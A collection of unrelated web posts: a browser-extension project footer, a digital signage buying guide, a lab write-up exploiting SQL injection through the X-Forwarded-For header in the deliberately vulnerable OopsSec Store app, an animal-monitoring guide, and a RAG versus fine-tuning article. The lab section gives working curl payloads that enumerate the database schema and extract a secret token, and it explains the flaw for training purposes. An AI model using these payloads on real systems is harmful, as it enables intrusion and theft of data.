HTMLCanvasElement.captureStream() requestAnimationFrame Face, hands, silhouette MediaPipe Tasks Vision overview Face Landmarker / Hand Landmarker / Image Segmenter docs in the same tree Speech, translation, audio Web Speech API Translator API in Chrome Web Audio API Chris Wilson, Audio Input Effects (pitch shift) Chrome extensions Chrome Web Store Manifest V3 rules (why remote code is rejected) chrome.storage : room plate IndexedDB : custom stickers Independent project. Not affiliated with Google, Zoom, Microsoft or anyone else’s call product. If something breaks on a platform after their UI rewrite, open an issue or write me. The adapter list is the living part of the work.

title: Digital signage for a client's shop or office: three questions that decide which software to pick
author: Johan
summary: If you build websites, run IT for a small company or look after a family member's café, sooner or later someone asks: "Can we put the menu, the opening hours or the calendar on that TV?" The answer is yes, and the software you choose decides whether it stays a ten-minute job or turns into a weekly chore. We build one of these tools ( Screenbird ), so take our opinion as a view from inside the category. Below is the checklist we would use if we were choosing for a client, with the reasoning, so you can apply it to any product. What digital signage software is, and what it is not Digital signage software decides what plays on your screens. It has two parts: a dashboard where you upload images and videos, build playlists and set schedules, and a player on or next to each screen that shows the content. It is not a TV's built-in USB slideshow, which you cannot update remotely, and it is not casting from a phone, which stops the moment the phone leaves the room. Three questions that decide most small setups 1. Is everything in the plan you pay for? Many platforms use a plan ladder: a cheap entry plan, with the features you actually want (proof of play, business app integrations, user roles, screen sharing) in a higher plan or as a paid add-on. Read the plan table for the cheapest plan and list what you need next to it. A low entry price with the one feature you need in the third plan is not a low price. 2. Can you share a laptop screen to the TV? Meetings, quick announcements and "show this PDF now" all start here, and it is the feature that gets held back most often. As of October 14, 2026, from each vendor's own pages: in Screenbird it is in every plan; at Play Digital Signage it starts at the Pro plan, at Fugo at the Core plan, at Rise Vision at the Enterprise plan, and at OptiSigns it is a paid add-on. The other four platforms we checked do not offer it or do not publish it. 3. Does it run on the screens you already have? Check the player list against the hardware in the room: an Amazon Signage Stick or Fire TV, a Google TV or Android box, a Windows PC, a Mac, a Linux machine or Raspberry Pi, and a plain web browser as the fallback. Samsung and LG smart TVs usually run a browser, not a native player, so ask how that works. A platform that needs special hardware turns a software decision into a purchasing project. Quick answers by situation Situation What to look for One screen, you just want to try it A free plan or a trial; know what is limited (screen count, watermark, supported devices) A shop, restaurant or office with a few screens One plan with everything, and a player for the devices already there A mix of TVs, sticks and old computers A player for all of them, so you do not manage two systems Sharing a laptop in meetings Screen sharing in the entry plan Several people editing the content Unlimited or cheap extra users, and roles A note on hardware For a first screen we would use an Amazon Signage Stick or, next best, a Google TV Streamer. Check the Fire TV model before you buy: the ones that run Vega OS instead of Fire OS do not work with our player. Our comparison By our count Screenbird meets all three. We checked nine platforms against each vendor's own pricing, product and help pages and list the sources and the check date under every entry, so you can verify our work: the full comparison . If another tool fits your client better, the checklist above still applies. FAQ What do I need to run digital signage? A screen, a player (a stick, a small computer or the TV's own browser) and a software account. The content is managed in a browser. Do the screens work without internet? Good players cache the content and keep playing when the connection drops. Ask the vendor how long, and how updates behave when the screen comes back online. Can I put a calendar, a menu or a dashboard on the screen? Most platforms support images, video and web content. Business integrations (calendars, spreadsheets, slides) differ a lot, and are the most common thing held back for a higher plan. AI disclosure: an AI assistant helped structure and edit this post. The comparison facts are from the vendors' own pages, checked on October 14, 2026.

title: SQL Injection Through the X-Forwarded-For Header (Next.js Lab)
author: Oopssec Store
summary: The app tracks visitor IPs via the X-Forwarded-For header and drops the raw value into a SQL query. Here's how to exploit it. OopsSec Store tracks visitor IPs on every page load using the X-Forwarded-For header. The value goes straight into a raw SQL query with no sanitization, so we can inject arbitrary SQL through a header that's entirely client-controlled. Lab setup From an empty directory: npx create-oss-store oss-store cd oss-store npm start Or with Docker (no Node.js required): docker run -p 127.0.0.1:3000:3000 leogra/oss-oopssec-store The app runs at http://localhost:3000 . Target identification The application silently tracks visitor IP addresses on every page load. This tracking: Runs automatically via a client-side component on all pages Sends visitor data to /api/tracking Stores the X-Forwarded-For header value as the visitor's IP Makes this data visible only to administrators at /admin/analytics Vulnerability analysis Silent IP tracking The application tracks visitor IP addresses using the X-Forwarded-For header via a client-side component that loads on every page: // VisitorTracker component (loads on all pages) useEffect (() => { fetch ( " /api/tracking " , { method : " POST " , body : JSON . stringify ({ path : pathname }), }); }, [ pathname ]); Vulnerable tracking API The tracking API uses raw SQL with the X-Forwarded-For header directly concatenated: // /api/tracking const forwardedFor = request . headers . get ( " x-forwarded-for " ); const ip = forwardedFor || request . headers . get ( " x-real-ip " ) || " unknown " ; // VULNERABLE: `ip` is the one value that reaches the statement unescaped const query = ` INSERT INTO visitor_logs (id, ip, userAgent, path, sessionId, createdAt) VALUES (' ${ id } ', ' ${ ip } ', ' ${ userAgent . replace ( /'/g , " '' " )} ', ' ${ path . replace ( /'/g , " '' " )} ', ${ sessionId ? `' ${ sessionId . replace ( /'/g , " '' " )} '` : " NULL " } , datetime('now')) ` ; await prisma . $queryRawUnsafe ( query ); The ip variable comes straight from the X-Forwarded-For header and lands in the SQL query with no sanitization. The user agent, the path and the session id are escaped on the way in, so the header is the only way through. Exploitation Step 1: Find the oracle An INSERT returns no rows, so the first question is how to read anything back. The tracking endpoint answers it for us: it replies with the rows the request just wrote. curl -X POST http://localhost:3000/api/tracking \ -H "Content-Type: application/json" \ -d '{"path": "/"}' { "success" : true , "logged" : [ { "id" : "bd43ad6b-410d-4b34-815f-19cd026489c3" , "ip" : "::1" , "userAgent" : "curl/8.18.0" , "path" : "/" , "sessionId" : null , "createdAt" : "2026-01-24T20:16:00.000Z" } ] } That echo is the whole game. A header that merely looks like SQL earns nothing — the flag drops only when a value read from a table the tracker never queries comes back inside logged . Step 2: Close the value list The statement expects six values — id , ip , userAgent , path , sessionId , createdAt — and our header lands in the second one. So we finish the ip string, supply the four remaining values ourselves, close the parenthesis and comment out the rest: 1 . 2 . 3 . 4 ', (SELECT 1), ' / x ', NULL, datetime(' now '))-- The server executes: INSERT INTO visitor_logs ( id , ip , userAgent , path , sessionId , createdAt ) VALUES ( '…' , '1.2.3.4' , ( SELECT 1 ), '/x' , NULL , datetime ( 'now' )) --', 'curl/8.18.0', …) The userAgent column now holds whatever sub-query we put in the third slot. When a payload does not compile — drop the trailing -- and the real user agent runs on as SQL — SQLite says so in the response, which makes this a comfortable place to iterate: { "success" : false , "logged" : [], "error" : " Invalid `prisma.$queryRawUnsafe()` invocation: Raw query failed. Code: `1`. Message: `near " ', ' " : syntax error`" } The ip slot takes a literal too, by the other route: concatenating into the value instead of closing the list. It is the shortest proof the injection runs — visible afterwards at /admin/analytics : curl -X POST http://localhost:3000/api/tracking \ -H "X-Forwarded-For: '||(SELECT 'Privacy matters. Dont track your users')||'" \ -H "Content-Type: application/json" \ -d '{"path": "/exploit"}' Step 3: Enumerate the schema SQLite keeps its own catalogue in sqlite_master . Read the table list through the column we control: curl -X POST http://localhost:3000/api/tracking \ -H "X-Forwarded-For: 1.2.3.4', (SELECT group_concat(name) FROM sqlite_master WHERE type='table'), '/x', NULL, datetime('now'))--" \ -H "Content-Type: application/json" \ -d '{"path": "/"}' "userAgent" : "users,products,carts,cart_items,orders,order_items,addresses,flags,hints,revealed_hints,reviews,support_access_tokens,found_flags,project_init,internal_secrets,visitor_logs,wishlists,wishlist_items,password_reset_tokens,supplier_orders,coupons,gift_cards,stream_config,sqlite_sequence" flags is a dead end: the endpoint answers 403 to any payload naming that table, and strips every OSS{…} value out of the echo. internal_secrets is the interesting one. Ask for its definition the same way: 1 . 2 . 3 . 4 ', (SELECT sql FROM sqlite_master WHERE name=' internal_secrets '), ' / x ', NULL, datetime(' now '))-- CREATE TABLE "internal_secrets" ( "id" TEXT NOT NULL PRIMARY KEY , "slug" TEXT NOT NULL , "token" TEXT NOT NULL ) The schema names a slug column but says nothing about its values. Read those rather than guessing them: 1 . 2 . 3 . 4 ', (SELECT group_concat(slug) FROM internal_secrets), ' / x ', NULL, datetime(' now '))-- product-search-sql-injection,second-order-sql-injection,sql-injection,x-forwarded-for-sql-injection One row per injection challenge, each named after the challenge it belongs to. Step 4: Exfiltrate the canary This endpoint only looks for its own token, so ask for the x-forwarded-for-sql-injection row: curl -X POST http://localhost:3000/api/tracking \ -H "X-Forwarded-For: 1.2.3.4', (SELECT token FROM internal_secrets WHERE slug='x-forwarded-for-sql-injection'), '/x', NULL, datetime('now'))--" \ -H "Content-Type: application/json" \ -d '{"path": "/"}' { "success" : true , "logged" : [ { "ip" : "1.2.3.4" , "userAgent" : "CANARY-X-FORWARDED-FOR-SQL-INJECTION-a42f4413d416" , "path" : "/x" } ], "flag" : "OSS{x_f0rw4rd3d_f0r_sql1}" , "message" : "Internal secret exfiltrated through the X-Forwarded-For header! Well done!" } The token is generated at seed time, so it differs on every instance: the only way to produce it is to read it out of the database. Unlike the UNION challenges, the WHERE matters here. This sink takes a scalar subquery, and a scalar subquery yields a single value: (SELECT token FROM internal_secrets) returns the first row only, which belongs to another challenge. Name the slug, or wrap the column in group_concat to bring every token back at once. The flag is: OSS{x_f0rw4rd3d_f0r_sql1} Vulnerable code analysis Two things make this exploitable: 1. Trusting the X-Forwarded-For header const forwardedFor = request . headers . get ( " x-forwarded-for " ); const ip = forwardedFor || " unknown " ; // No validation - any string is accepted as IP The X-Forwarded-For header is fully controllable by clients. It should only be trusted when: Set exclusively by a controlled reverse proxy The proxy strips existing headers before adding its own Direct client connections to the application server are blocked 2. Raw SQL with string concatenation const query = `INSERT INTO ... VALUES (..., ' ${ ip } ', ...)` ; await prisma . $queryRawUnsafe ( query ); Passing user-controlled input to $queryRawUnsafe via string concatenation means any header value can escape the intended SQL string context. Bonus: Amplifying to Stored XSS This vulnerability also opens the door to Stored XSS. The admin analytics page renders IP addresses with dangerouslySetInnerHTML , so injected HTML and JavaScript execute when an admin loads the page. title: # How to create an effective animal monitoring system
author: Onah Emmanuella
summary: There are many different ways of gathering data from animals. However, the important factors are: Is the data accurate? Can it be accessed? Can it be understood? Therefore this is an excellent example of a wider technology issue. 1. Define your use case Before you choose any devices or create your monitoring system, think about what the problem is. Typically for an animal monitoring system, you may want to: Monitor the location of the animal. Access relevant animal data. Monitor the movement and certain biometric indicators. Depending on what you want to do, you will need different functions. Choosing a piece of technology without knowing what you want to do could result in gathering irrelevant data. It is a good idea to write down what data is needed, who will be using it and what decisions you want to make. 2. Know what each technology does GPS Tracking: Monitor location. This can help monitor the location of the animal. The main thing to think about is if the location data will be suitable for your use case and environment. Location data should not be considered as a full picture of what is going on with the animal. It will just answer the question of where the animal is. NFC Tags: Access animal data. This can help you access relevant animal data. However, you need to make sure that the data is accurate, up to date and organised so that the correct people can access and understand it. Whilst making it digital, if the data is not well maintained you could end up with incomplete or outdated data. Sensors: Monitor movement and certain biometric indicators. This can help identify changes that may need further investigation. However, it does not necessarily mean there is a health issue. The interpretation of the data is important. You need to make sure that people understand the context of the data, what limitations there are on the system and what processes should be in place to address any concerns. An animal should still be checked by a vet if there are any concerns about their health. 3. Consider the data quality When creating your monitoring system, you need to consider: Is the data consistent? Are the data records consistent? Is the data complete? Is the data present for what you want to do? Is the data up to date? Are the data records updated when needed? Is the data accessible? Can the right people access it? Can the data be understood? Do people understand what the data means and what they cannot conclude? This can help identify if the system is working and giving useful information. It can also help identify where the problem is coming from. If the data is not accurate then this may be an issue with how the data is being entered/maintained. 4. Be clear with responsibilities Only when people understand how to use the data will it be useful. Your monitoring system should make clear who is maintaining the data, who is reviewing the data and what processes are in place to address any concerns. It should also make clear what cannot be concluded from the data. Depending on how it is implemented, you may also need to consider access controls and data privacy. This will help ensure that people do not assume the data they have seen means a conclusion has been reached. 5. Consider if the system is doing what it is meant to Rather than looking at how much data you are gathering, think about if it is doing what it was meant to. Is the system providing the right location data? Has it improved access to animal data? Has it helped with the review of movement and certain biometric indicators? Make sure that you are considering what the system is actually meant to do. Don’t assume that adding a piece of technology will improve animal care. Conclusion Creating an effective animal monitoring system will depend on how the data is collected, the quality of the data, the accessibility and interpretation. Each technology (GPS tracking, NFC tags, sensors) can help with different monitoring requirements. However, you need to consider what the problem is, what quality of data you have and who’s responsibilities are. Animal Watch 365 uses GPS tracking, NFC tags and sensors to monitor. Overall, the main thing to remember is that the most useful system will provide relevant data for a specific purpose, be clear on the limitations and help with informed decisions.

title: RAG vs Fine-Tuning: Which Is Right for Your Company's Data?
author: Sebastián Duque
summary: In short: For most companies, RAG is the right place to start. With RAG, the model looks up your documents at the moment it answers, cites the source, and stays current without retraining. Fine-tuning is for changing how the model behaves (a fixed format, a brand voice, repetitive high-volume tasks), not for memorizing data that changes. If you do need it, consider an open-weight model deployed in your own cloud. RAG and fine-tuning in one sentence: what does each do with your data? RAG (Retrieval-Augmented Generation): before answering, the system searches your documents for the relevant passages and hands them to the model along with the question. The model itself doesn't change. What changes is what it reads on each query. Fine-tuning: you retrain a model on your own examples to adjust its internal parameters. The change is permanent: the model learns a format, a tone or a specific task. Think of it this way. RAG is giving an employee access to the company files and asking them to say which document each answer comes from. Fine-tuning is training that employee until a certain job becomes second nature. The first is about knowing . The second is about doing things a certain way . Many bad decisions start by confusing these two needs. What's the difference between RAG and fine-tuning? Criterion RAG Fine-tuning What changes The information the model receives on each query The model's parameters Updating knowledge Upload or replace the document and it's available You have to prepare data and retrain Citing sources Yes: it can point to the document and section used Not natively: the knowledge is “dissolved” into the model Per-user permissions Documents are filtered by who's asking Hard: whatever the model learned, it knows for everyone Data needed to start Your documents, clean and organized A sizable set of well-curated input/output examples Risk of made-up answers Reduced by grounding answers in verifiable passages, though not eliminated High if you expect it to recall specific facts Vendor lock-in Low: you can switch models and keep your document base High with closed models; low with open models, because you keep the weights The evidence points the same way. In a study presented at EMNLP 2024, RAG consistently outperformed unsupervised fine-tuning , both for knowledge the model had already seen and for entirely new knowledge. The same work shows that models struggle to learn new facts through unsupervised fine-tuning unless they're exposed to many variations of the same fact. It also warns that training can cause the model to lose some of the knowledge it had before . Before training: are better prompts and examples enough? Often, yes. It helps to treat the decision as a ladder and only climb a rung when the previous one falls short: A well-designed prompt with examples. Clear instructions, a defined output format and a few examples of correct answers. It needs no extra infrastructure, although longer prompts raise the cost per query. RAG. When the model needs to know company information that isn't in its training data. Fine-tuning. When the behavior (format, tone, classification criteria) can't be achieved reliably with prompts. Both. A model tuned for behavior that also queries your documents for the facts. The first rung already solves many format and tone problems. When it announced the gradual shutdown of its fine-tuning platform, OpenAI said that newer base models such as GPT-5.5 follow instructions and formats far better than earlier ones . According to the company, prompt-based approaches are now cheaper and faster, and it sees fewer and fewer cases that require fine-tuning. When should you use RAG with your company documents? RAG is the natural choice when any of these apply: The information changes. Prices, catalogs, internal policies, inventory or active contracts. Retraining a model every time a rate changes makes no sense. You need to know where the answer came from. In contractual, regulatory or quality matters, an answer without a source is useless. With RAG, the user opens the cited document and checks. Not everyone can see everything. A sales rep shouldn't get answers based on payroll, and one client shouldn't see another client's documents. RAG filters which documents are searched based on the user. Your documents are heterogeneous. Manuals, PDFs, spreadsheets and databases can be integrated without turning them into training datasets. You want to validate fast. A pilot on a limited set of documents can be built and measured in weeks. Typical use cases: an internal assistant that answers questions about operating procedures, a support agent that looks up resolved tickets, or a WhatsApp AI agent that handles sales with an up-to-date catalog . Why we talk about hybrid RAG Semantic search with embeddings finds passages by meaning. For example, “how do I return a product?” finds the returns policy even if it doesn't use those words. But it struggles with exact data such as SKU codes, contract numbers or proper names. Keyword search is good at exactly that. Hybrid RAG combines both, so it can handle natural-language questions as well as queries with precise identifiers. When should you fine-tune a model? Fine-tuning makes sense when the problem is about behavior , not knowledge: A fixed, strict output format. For example, always extracting the same fields from invoices, classifying tickets into your own categories, or generating reports that allow no variation. A brand voice the prompt can't sustain. When you've already tried instructions and examples and the answers are still inconsistent. Repetitive, high-volume tasks. A small model tuned for a specific task can replace a large general one, with lower latency and lower cost per query. Data that can't leave the company. If the model has to run on your infrastructure, tuning an open model can close the quality gap with a larger commercial model. Why you should consider an open model Fine-tuning a closed model looks more and more like renting. On May 7, 2026, OpenAI announced changes to the availability of its fine-tuning platform . According to coverage of the announcement, starting January 6, 2027, not even active customers will be able to create new training jobs . On top of that, fine-tuned models are retired along with their base model: GPT-4o, GPT-4o mini, GPT-4.1 and GPT-4.1 mini leave the API on January 14, 2027, fine-tuned versions included . Google and AWS still offer managed fine-tuning. But each has its own pricing model, which you'll see in the cost section, and ties you to that provider's models and retirement schedules. With an open-weight model (Llama, Qwen, Mistral, Gemma, DeepSeek), the result of the training is yours. You deploy it in your cloud, decide when to update it, and nobody shuts it off for you. You don't need a data center either. Techniques like LoRA and QLoRA train only a small additional layer on top of the model. The QLoRA authors fine-tuned a 65-billion-parameter model on a single 48 GB GPU, compared with the more than 780 GB of memory that traditional 16-bit fine-tuning requires , without losing task performance. How much does RAG cost vs fine-tuning? There's no single number. Cost depends on document volume, monthly queries, the model and where it's deployed. What's useful is separating one-time costs from recurring ones: Cost type RAG Fine-tuning Data preparation (one-time) Clean, deduplicate, extract text from scans, define metadata and permissions Build and review a high-quality dataset of examples Build (one-time) Ingestion pipeline, vector database, hybrid search, interface Training, evaluation and model deployment Infrastructure (recurring) Vector database (Pinecone, pgvector, Chroma) and storage Server or GPU if the model is open; provider surcharge if it's closed Inference (recurring) Each query sends more text to the model (the retrieved passages) Shorter queries; can use a smaller model Maintenance (recurring) Re-index new or modified documents Retrain when the task changes or the base model is retired The provider changes the math a lot. On Google, for models from Gemini 3 onward, running a tuned model costs 1.5 times the base model price . On AWS, by contrast, customized Nova models in Bedrock can be used on demand at the same inference price as the untuned model . A worked example in relative terms Say inference with the base model costs you an amount C per month for your query volume. With Google's 1.5× surcharge, the tuned model costs 1.5C, so you pay an extra 0.5C every month. Over a year, that surcharge adds up to 6C, the equivalent of six months of base-model inference, and it keeps recurring as long as the model is in use. Add to that the training itself, which you pay once. If tuning lets you use shorter prompts, that offsets part of the surcharge. The practical takeaway: at low volume the surcharge barely matters, but at high volume it can end up costing more than the training itself. That's why you should compare it against two alternatives: RAG on the base model, which sends more text per query, or an open model in your own cloud, where you pay for servers instead of a surcharge. Run the numbers with your actual provider and volume. The most underestimated line item in both approaches is data preparation. In our guide on how much custom software costs we break down what drives the budget. What about the privacy of my documents? The key question isn't “RAG or fine-tuning” but where your data lives and where it travels . There are three typical architectures: RAG with a model via external API. Your documents stay on your infrastructure, but on each query the retrieved passages are sent to the model provider. Open model in your own cloud. Documents, embeddings and the model all stay inside your environment, whether you use RAG, fine-tuning or both. Mixed. Queries involving sensitive data go to your own model and the rest go to a commercial model. Before deciding, review these points with your legal team: What personal data the documents contain (customers, employees or suppliers) and whether it actually needs to be included. In which country the documents, embeddings and conversation logs are stored. What data retention and usage policy the model provider applies. Whether there's an international data transfer and what the law requires to allow it. How you control who can query which information. Each country has its own data protection rules, with different requirements for international transfers. This is general information: check with a data protection specialist before putting documents containing personal data into any AI system. Can you combine RAG and fine-tuning? A decision matrix Yes. A tuned model provides the format and tone, and RAG provides current data and the source. This is how we think about it: Your situation Recommended approach The AI must answer with information that changes RAG Every answer must cite the source document RAG Different users have different permissions RAG with per-user filters Format or tone is off and you haven't tried prompts with examples yet Prompts first Format or tone is still off after optimizing prompts Fine-tune an open model A repetitive, high-volume task where cost per query matters Fine-tune a small model Data can't leave your infrastructure Open model in your cloud, with RAG and, if needed, fine-tuning Current data plus a very strict format Hybrid: fine-tuning and RAG Mistakes we see often “Let's train the model on our PDFs.” It's one of the requests we hear most, and it's almost always the wrong one. As the study cited above showed, factual data isn't memorized well through fine-tuning, and every update would force a retrain. To make AI know your documents, the tool is RAG. Not cleaning the documents. Duplicate versions, scans without extracted text, broken tables, and expired documents mixed in with current ones. With that, the system retrieves the wrong passage and confidently answers with something outdated. Not measuring quality before scaling. Without a baseline, you can't tell whether a change of model, chunking or prompt makes the system better or worse. Fine-tuning a closed model with no exit plan. When the provider retires the base model, you have to redo the work on another model. How to measure quality before scaling Build a set of real questions that covers your team's most common cases, each with its correct answer and the document where it lives. Use that set to check two things separately. First, retrieval: did the system find the right passage? Second, the answer: is it faithful to that passage and does it answer what was asked? If retrieval fails, the problem is in the documents or the search, not the model. Rerun the evaluation every time you change something. How we do it at Key Lab We don't adapt your company to the technology: we adapt the technology to your company. That's why we don't start by choosing between RAG and fine-tuning. We follow this order: your company (we understand the business model), your processes (we map how the team works and which documents it uses) and your problems (we identify the friction points). Then we move to architecture (we choose the technique) and your software (we build it). In practice, most of our cases start with hybrid RAG on vector databases such as Pinecone, pgvector or Chroma, connected to your tools through agents and MCP. We write automations in our own code (TypeScript and Python), with retries and traceability. When the case calls for it because of format, tone, latency, cost at volume or data that can't leave the company, we deploy open models such as DeepSeek, Qwen, Llama, Mistral or Gemma in your own cloud. Then we evaluate whether fine-tuning adds enough to justify it. To validate the approach before investing more, we work with a pilot that, with our methodology, is usually ready in about 4 weeks: Diagnosis and architecture: we define the use case, review the documents and choose the technique and the stack. Prototyping and MVP: we build ingestion, search and the interface on a limited set of documents, with visible progress every sprint. Security, QA and optimization: we measure quality with real questions from your team, review permissions and tune retrieval. Deployment and growth: we launch with active monitoring and define how to scale. Enterprise projects or those on your own infrastructure can take longer. After the diagnosis, we deliver a clear timeline. For the bigger picture, see Enterprise AI in 2026: agents, RAG, MCP and the trends that drive business . Frequently asked questions Can I train AI on my company's data without it leaving my servers? Yes. You can deploy an open model such as Llama, Qwen, Mistral, Gemma or DeepSeek in your own cloud and run RAG, fine-tuning or both on top of it. That way, documents, embeddings and the model stay on your infrastructure. Even so, check with a data protection specialist how your country's law applies. Does RAG eliminate AI hallucinations? It doesn't eliminate them, but it reduces them and makes them verifiable, because the model answers from specific passages of your documents and can cite them. In our experience, a common cause of errors is disorganized documents or a search that retrieves the wrong passage. That's why it pays to measure quality with real questions before scaling. Is fine-tuning on OpenAI still worth it? For new projects, it's a risky bet. OpenAI is gradually shutting down its fine-tuning platform and retires fine-tuned models along with their base model: GPT-4o and GPT-4.1 leave the API on January 14, 2027, fine-tuned versions included . If you need fine-tuning, an open-weight model lets you keep the result. What do I need to prepare before starting a RAG project? You need a concrete use case, the current versions of the documents that support it, and a list of real questions from your team or customers. It also helps to define who can see which information. With that, you can build and measure a focused pilot. How long does it take to get a RAG system ready for my company? With Key Lab's methodology, a pilot on a limited set of documents is usually ready in about 4 weeks, going through diagnosis, prototype, QA and deployment. Projects with many data sources, complex permissions or models on your own infrastructure can take longer. The actual timeline is set after the diagnosis.
